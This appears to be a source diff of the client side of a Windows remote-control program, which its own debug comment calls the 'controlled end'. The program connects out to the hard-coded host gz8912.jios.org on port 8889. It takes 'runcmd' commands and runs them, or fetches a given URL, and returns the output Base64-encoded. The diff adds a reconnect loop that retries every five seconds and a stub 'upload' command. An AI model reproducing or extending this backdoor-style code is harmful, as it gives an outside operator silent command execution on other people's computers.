@@ -7,7 +7,7 @@
 #include "..\iocp\IOCPExport.h"
 #pragma comment(lib,"IOCP.lib")
 
-#include "..\公共\MemIni.h"
+#include "..\公共\ProtocolHandler.h"
 
 
 
@@ -18,6 +18,14 @@
 #include <UrlMon.h>
 #pragma comment(lib,"urlmon.lib")
 #include <atlstr.h>
+
+#include "..\公共\Base64.h"
+
+#if defined(DEBUG) || defined(_DEBUG)
+#define REMOTE_SERVER_IP "localhost"
+#else
+#define REMOTE_SERVER_IP "gz8912.jios.org"
+#endif
 
 CString GetHttpString( LPCWSTR pszUrl )
 {
@@ -206,31 +214,22 @@ VOID WINAPI MsgOutputCallBack( PVOID pParam,LPCSTR pszOutputMsg )
 	HANDLE hClient = pOutputParam->hClient;
 	if (hClient)
 	{
-		CString strMsgOutput;
-		strMsgOutput = pszOutputMsg;
-		strMsgOutput.Replace(L"\r",L"\\r");
-		strMsgOutput.Replace(L"\n",L"\\n");
+		CProtocolHandler ptlHandler;
+		ptlHandler.SetParamValueString( "cmd","runcmd" );
+		ptlHandler.SetParamValueString( "result",EasyBase64Encode(pszOutputMsg) );
+		ptlHandler.SetParamValueInt( "target",(int)pOutputParam->hSource);
+		CStringA strResponseData;
+		strResponseData = ptlHandler.BuildData();
 
-		
-		CMemIniFile IniResponse;
-		IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
-		
-		while ( strMsgOutput.GetLength() > 0 )
-		{
-			CString strTempMsgOutput;
-			strTempMsgOutput = strMsgOutput.Left(128);
-		
-			strMsgOutput.Delete(0,128);
+#ifdef DEBUG
+//  		OutputDebugStringA("被控端\r\n");
+//  		OutputDebugStringA(pszOutputMsg);
+//  		OutputDebugStringA("\r\n");
+// 		OutputDebugStringA(EasyBase64Encode(pszOutputMsg));
+// 		OutputDebugStringA("\r\n");
+#endif
 
-			IniResponse.WriteIniString( L"",L"result",strTempMsgOutput);
-			IniResponse.WriteIniInt(L"",L"target",(int)pOutputParam->hSource);
-			CString strResponseData;
-			strResponseData = IniResponse.BuildData();
-
-			//OutputDebugStringW(strResponseData+L"\r\n");
-
-			ClientSendData(hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR));
-		}
+		ClientSendData(hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
 	}
 
 }
@@ -316,23 +315,22 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 
 		if ( strWebUrl.GetLength() > 0 )
 		{
-			CString strWebText;
+			CStringA strWebText;
 			strWebText = GetHttpString( strWebUrl );
-			strWebText.Replace(L"\r",L"\\r");
-			strWebText.Replace(L"\n",L"\\n");
 
-			CMemIniFile IniResponse;
-			IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
-			IniResponse.WriteIniString( L"",L"result",strWebText);
-			IniResponse.WriteIniInt( L"",L"target",(int)pRunCmdParam->hSource);
+			CProtocolHandler ptlResponse;
+			ptlResponse.SetParamValueString( "cmd","runcmd");
+			ptlResponse.SetParamValueString( "result",EasyBase64Encode(strWebText));
+			ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);
 
-			CString strResponseData;
-			strResponseData = IniResponse.BuildData();
-
-			//OutputDebugStringW(strResponseData+L"\r\n");
-			
-			ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR));
+			CStringA strResponseData;
+			strResponseData = ptlResponse.BuildData();
+			ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
 		}
+
+	}
+	else if( pRunCmdParam->strCmdData.Find(L"upload") >= 0 )
+	{
 
 	}
 	else
@@ -342,18 +340,15 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 
 	
 
-	CMemIniFile IniResponse;
-	IniResponse.WriteIniString( L"",L"cmd",L"runcmd");
-	IniResponse.WriteIniString( L"",L"result",L"命令执行完成\r\n");
-	IniResponse.WriteIniInt( L"",L"target",(int)pRunCmdParam->hSource);
+	CProtocolHandler ptlResponse;
+	ptlResponse.SetParamValueString( "cmd","runcmd");
+	ptlResponse.SetParamValueString( "result",EasyBase64Encode("\r\n命令执行完成\r\n"));
+	ptlResponse.SetParamValueInt( "target",(int)pRunCmdParam->hSource);
 
-	CString strResponseData;
-	strResponseData = IniResponse.BuildData();
+	CStringA strResponseData;
+	strResponseData = ptlResponse.BuildData();
 
-	OutputDebugStringW(strResponseData+L"\r\n");
-
-	ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength()*sizeof(WCHAR));
-
+	ClientSendData(pRunCmdParam->hClient,(BYTE *)strResponseData.GetBuffer(),strResponseData.GetLength());
 
 	delete pRunCmdParam;
 
@@ -366,13 +361,13 @@ DWORD WINAPI RunCmdThread( PVOID pParam )
 
 VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen )
 {
-	CMemIniFile Ini;
-	Ini.ParseMemoryDataW((BYTE *)pDataBuffer,dwDatalen);
+	CProtocolHandler ptlHandler;
+	ptlHandler.ParseProtocolString((LPCSTR)pDataBuffer,dwDatalen);
 
-	HANDLE hSource = (HANDLE)Ini.GetIniUint(L"",L"source",0);
+	HANDLE hSource = (HANDLE)ptlHandler.GetParamValueInt("source",0);
 
 	CString strCmd;
-	strCmd = Ini.GetIniString(L"",L"cmd",L"");
+	strCmd = ptlHandler.GetParamValueString("cmd","");
 	if (strCmd == L"runcmd")
 	{
 		BOOL bCanRunCmd = FALSE;
@@ -383,7 +378,7 @@ VOID WINAPI DataRecvCallback( HANDLE hClient, BYTE *pDataBuffer,DWORD dwDatalen 
 		if (bCanRunCmd)
 		{
 			CString strCmdData;
-			strCmdData = Ini.GetIniString(L"",L"data",L"");
+			strCmdData = ptlHandler.GetParamValueString("data","");
 
 			PRUN_CMD_PARAM pRunCmdParam = new RUN_CMD_PARAM;
 			pRunCmdParam->hSource = hSource;
@@ -401,7 +396,7 @@ VOID WINAPI ConnectClosed( HANDLE hClient )
 	while (TRUE)
 	{
 		hClient = CreateClient(DataRecvCallback,ConnectClosed);
-		BOOL bConRes = ClientConnect(hClient,"gz8912.jios.org",8889);
+		BOOL bConRes = ClientConnect(hClient,REMOTE_SERVER_IP,8889);
 
 		if (bConRes)
 		{
@@ -435,12 +430,21 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 // 		ExecCmdLine(L"tasklist /M",TestMsgOutputCallBack,NULL);
 // 		return 0;
 // 	}
-	HANDLE hClient = CreateClient(DataRecvCallback,ConnectClosed);
-	BOOL bConRes = ClientConnect(hClient,"gz8912.jios.org",8889);
-	
-	if (bConRes)
+
+	while (TRUE)
 	{
-		StartRecvData(hClient);
+		HANDLE hClient = CreateClient(DataRecvCallback,ConnectClosed);
+		BOOL bConRes = ClientConnect(hClient,REMOTE_SERVER_IP,8889);
+
+		if (bConRes)
+		{
+			StartRecvData(hClient);
+			break;
+		}
+
+		DeleteClient(hClient);
+
+		Sleep(5000);
 	}
 
 	while (1)
